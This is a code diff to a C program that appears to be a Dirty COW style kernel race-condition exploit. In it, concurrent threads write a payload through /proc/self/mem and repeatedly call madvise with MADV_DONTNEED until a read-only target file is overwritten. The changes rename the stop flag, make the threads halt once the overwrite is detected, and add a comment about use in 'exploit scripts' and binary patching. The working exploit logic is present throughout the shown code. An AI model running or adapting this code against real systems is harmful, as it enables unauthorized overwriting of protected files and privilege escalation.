@@ -3,12 +3,15 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+
 #include <errno.h>
 #include <fcntl.h>
 #include <pthread.h>
 #include <string.h>
+
 #include <getopt.h>
 #include <unistd.h>
+
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/mman.h>
@@ -33,11 +36,10 @@
 		ERR_IF(_val > 0);      \
 	} while (0)
 
-#define VIRTUAL_MEMORY    "/proc/self/mem"
-#define THREAD_ITERATIONS 10000
+#define VIRTUAL_MEMORY "/proc/self/mem"
 
 char *progname = NULL;
-bool stop_thread = false;
+bool stop_threads = false;
 
 typedef struct payload_info {
 	char *payload;
@@ -56,7 +58,7 @@ static void *writer_thread(void *arg) {
 	int mem_fd = open(VIRTUAL_MEMORY, O_RDWR);
 	ERR_IF(mem_fd < 0);
 
-	while (!stop_thread) {
+	while (!stop_threads) {
 		lseek(mem_fd, (off_t) payload_offset, SEEK_SET);
 		write(mem_fd, str, strlen(str));
 	}
@@ -68,7 +70,7 @@ static void *writer_thread(void *arg) {
 static void *madviser_thread(void *arg) {
 	PayloadInfo *info = arg;
 
-	while (!stop_thread) {
+	while (!stop_threads) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
 
@@ -79,7 +81,7 @@ static void *wait_for_write(void *arg) {
 	PayloadInfo *info = arg;
 	size_t len = strlen(info->payload);
 
-	while (true) {
+	while (!stop_threads) {
 		char buf[len];
 		memset(buf, '\0', len);
 
@@ -88,22 +90,20 @@ static void *wait_for_write(void *arg) {
 
 		ERR_IF(lseek(fd, info->offset, SEEK_SET) < 0);
 		ERR_IF(read(fd, buf, len) < 0);
-		
-		// close fd before breaking or relooping
 		close(fd);
-		
+
+		// XXX: This fails if there's a null byte in the payload. Doesn't cause
+		//      issues in the exploit scripts, but it could be problematic if
+		//      using it to patch binaries, etc.
 		if (memcmp(buf, info->payload, len) == 0) {
-			puts("Target file is overwritten");
-			break;
+			puts("Target file is overwritten; stopping threads.");
+			stop_threads = true;
 		}
 
 		// Push this thread to back of run queue allowing "madvisor_thread" and "writer_thread"
 		// priority to run, this way after each examination, something new is guaranteed to possibly happen 
 		ERR_IF_PTHREAD(pthread_yield());
 	}
-
-	stop_thread = true;
-	puts("Stopping threads");
 
 	return NULL;
 }
